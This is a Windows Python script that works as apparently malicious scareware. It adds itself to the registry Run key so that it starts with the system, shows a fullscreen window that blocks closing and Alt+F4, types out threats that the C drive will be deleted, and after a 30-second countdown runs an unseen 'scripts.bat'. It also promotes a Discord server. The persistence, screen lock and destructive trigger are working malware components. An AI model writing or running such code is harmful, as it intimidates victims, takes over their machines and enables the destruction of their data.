import os
import sys
import time
import threading
import tkinter as tk
import shutil
import winreg as reg

# Function to block Alt+F4 and closing the window
def prevent_close(window):
    window.protocol("WM_DELETE_WINDOW", lambda: None)  # Prevent close button
    window.bind("<Alt-F4>", lambda e: "break")  # Prevent Alt+F4

# Function to display sentences with typing effect
def display_sentences(window, sentences, label):
    for sentence in sentences:
        typing_effect(window, label, sentence)
        time.sleep(1)  # Wait before showing the next sentence

    start_countdown(window)

# Function to simulate the typing effect
def typing_effect(window, label, sentence):
    label.config(text="")
    for i in range(len(sentence)):
        label.config(text=sentence[:i+1])
        window.update()
        time.sleep(0.05)  # Faster typing speed, adjust to your preference

# Function for the countdown
def start_countdown(window):
    countdown_label = tk.Label(window, text="30", font=("Arial", 100), fg="white", bg="black")
    countdown_label.pack(expand=True)

    for i in range(30, 0, -1):
        countdown_label.config(text=str(i))
        window.update()
        time.sleep(1)

    run_batch_file()
    window.quit()  # Close the window forcefully

# Function to run the batch file
def run_batch_file():
    batch_file = "scripts.bat"  # Replace with the path to your batch file
    if os.path.exists(batch_file):
        os.system(batch_file)  # Run the batch file
    else:
        print(f"Batch file not found: {batch_file}")

# Function to add the script to startup
def add_to_startup():
    script_path = sys.argv[0]  # Get the current script path
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_WRITE)
    reg.SetValueEx(reg_key, "MyScript", 0, reg.REG_SZ, script_path)
    reg.CloseKey(reg_key)

# Main function
def main():
    # Add the script to startup
    add_to_startup()

    # List of sentences to display
    sentences = [
        "I told you not to fuck with me bro",
        "So, when the time hits zero the C drive will be deleted",
        "Oh also man, from the guy who made this program",
        "You can join my discord and get my github link for revenge",
        "Anyways",
        "Goodbye to this pc.",
        "https://discord.gg/95sJWb7WFC"
    ]

    # Create a Tkinter window
    window = tk.Tk()
    window.attributes("-fullscreen", True)  # Make the window fullscreen
    window.config(bg="black")

    # Create a label to display the text
    label = tk.Label(window, text="", font=("Arial", 50), fg="white", bg="black")
    label.pack(expand=True)

    # Prevent the window from being closed
    prevent_close(window)

    # Start the sentence display in a separate thread
    threading.Thread(target=display_sentences, args=(window, sentences, label), daemon=True).start()

    window.mainloop()

if __name__ == "__main__":
    main()
